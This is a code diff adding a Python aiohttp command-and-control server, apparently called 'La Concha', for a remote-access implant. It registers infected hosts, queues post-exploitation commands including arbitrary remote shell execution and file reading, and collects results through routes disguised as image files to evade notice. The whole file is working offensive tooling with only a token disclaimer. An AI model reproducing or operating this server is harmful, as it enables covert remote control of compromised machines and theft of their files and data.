@@ -1,1 +1,194 @@
-#!/usr/bin/python
+#!/usr/bin/python3
+
+import os
+from aiohttp import web
+from datetime import datetime
+from termcolor import cprint, colored
+
+cmds = {}
+cmdnum = 0
+
+def printAlert(text):
+    print(colored("[*]", "blue"), text)
+    return True
+
+def lwd():
+    return os.getcwd()
+
+def lcd(directory):
+    if os.path.exists(directory):
+        os.chdir(directory)
+        return True
+    else:
+        return False
+
+def lls():
+    return os.listdir()
+
+def help_menu():
+    cprint("Help Menu:", 'white')
+    cprint("-------------------", "red")
+    print("[Local Commands]")
+    cprint("-------------------", "red")
+    print("lwd - prints local working directory")
+    print("lcd - changes local directory")
+    print("lls - list files in local directory")
+    print("!sh - run local shell commands")
+    cprint("-------------------", "red")
+    print("[Post Exploitation]")
+    cprint("<basic commands>", "blue")
+    print("cd - change directory")
+    print("pwd - prints working directory")
+    print("ls - list files")
+    print("cat - print file contents")
+    print("shell - run shell commands on remote system",colored("RISKY!", "red"))
+    cprint("More coming soon!", "blue")
+    cprint("-------------------", "red")
+    print("[Basic Options]")
+    print("help - list commands")
+    print("? - list commands")
+    print("done - send command queue to target")
+    print("exit- kill c2 server")
+    return 0
+
+async def synInit(request):
+    global host
+    host = request.transport.get_extra_info('peername')[0]
+    data = await request.post()
+    if data['initialize'] == 'SYN':
+        printAlert("Attempted connection by: %s" % host)
+        return web.Response(text="ACK")
+    else:
+        return web.HTTPNotFound()
+
+async def remote_ls(request):
+    data = await request.post()
+    print('\n')
+    printAlert("Exec: ls")
+    list = data['list'].split(';')
+    for item in list:
+        print(item)
+    return web.Response(text='OK')
+
+async def remote_pwd(request):
+    data = await request.post()
+    print('\n')
+    printAlert("Exec: pwd")
+    print(data['pwd'])
+    return web.Response(text='OK')
+
+async def remote_cd(request):
+    data = await request.post()
+    print('\n')
+    printAlert("Exec: cd %s" % data['dir'])
+
+    if data['success'] == 'True':
+        printAlert("New working directory: %s" % data['pwd'])
+    else:
+        printAlert("Directory not found: %s" % data['dir'])
+    return web.Response(text='OK')
+
+async def remote_cat(request):
+    data = await request.post()
+    print('\n')
+    printAlert("Exec: cat %s" % data['file'])
+    print(data['content'])
+    return web.Response(text='OK')
+
+async def remote_shell(request):
+    data = await request.post()
+    print('\n')
+    printAlert("Exec: %s" % data['cmd'])
+    print(data['output'])
+    return web.Response(text='OK')
+
+async def connect(request):
+    data = await request.post()
+    if data['initialize'] == 'ACK':
+        username = data['username']
+        hostname = data['hostname']
+        cwd = data['cwd']
+
+        global cmdnum
+        global cmds
+
+        cmdnum = 0
+        cmds = {}
+
+        while True:
+            tstamp = str(datetime.now())[:-7]
+            x = input(colored("%s@%s:[%s]<%s> " % (username, hostname, cwd, tstamp), "red"))
+            if x == 'done':
+                printAlert("Sending command queue to %s!" % hostname)
+                printAlert("Waiting on responses.\n")
+                return web.json_response(cmds)
+            elif x in ['help', '?']:
+                help_menu()
+            elif x == 'lwd':
+                print(lwd())
+            elif 'lcd' in x:
+                try:
+                    directory = x.split(' ')[1]
+                    if lcd(directory):
+                        printAlert("Switched to %s" % lwd())
+                    else:
+                        printAlert("Directory not found: %s" % directory)
+                except:
+                    printAlert("Usage: lcd <directory>")
+            elif x == 'lls':
+                list = lls()
+                list.sort()
+                for item in list: print(item)
+            elif '!sh' in x:
+                cmd = x[4:]
+                os.system(cmd)
+            elif x == 'ls':
+                cmdnum += 1
+                cmds.update({cmdnum : 'ls'})
+                printAlert("ls will be executed when the list is submitted.")
+            elif x == 'pwd':
+                cmdnum += 1
+                cmds.update({cmdnum : 'pwd'})
+                printAlert("pwd will be executed when the list is submitted.")
+            elif 'cd' in x:
+                cmdnum += 1
+                cmds.update({cmdnum : x})
+                printAlert("%s will be executed when the list is submitted." % x)
+            elif 'cat' in x:
+                cmdnum += 1
+                cmds.update({cmdnum : x})
+                printAlert("%s will be executed when the list is submitted." % x)
+            elif 'shell' in x:
+                cmdnum += 1
+                cmds.update({cmdnum : x})
+                printAlert("%s will be executed when the list is submitted." % x)
+            elif x == 'exit':
+                printAlert("Killing c2 server.")
+                exit(0)
+            else:
+                printAlert("Command not found.")
+
+
+app = web.Application()
+app.add_routes([web.route('*', "/initialize/syn", synInit),
+                web.route('*', "/initialize/ack", connect),
+                web.route('*', "/assets/flower.jpg", remote_ls),
+                web.route('*', "/assets/bug.jpg", remote_pwd),
+                web.route('*', "/assets/fly.jpg", remote_cd),
+                web.route('*', "/assets/cat.jpg", remote_cat),
+                web.route('*', "/assets/mudcrab.jpg", remote_shell)])
+
+if __name__ == '__main__':
+    os.system('clear')
+    cprint("""
+    La Conchaaaaaaaaaaaaa [Made by: 0xShaolin <Diante J.>]
+    Contact: odinsecurity@protonmail.com
+    Github: https://github.com/0xShaolin
+
+    DISCLAIMER: USAGE OF THIS TOOL AGAINST UNAUTHORIZED SYSTEMS IS
+    PROHIBITED. happy hacking!
+    """, "magenta")
+    try:
+        web.run_app(app, port=8080)
+    except KeyboardInterrupt:
+        printAlert("Killing c2 server.")
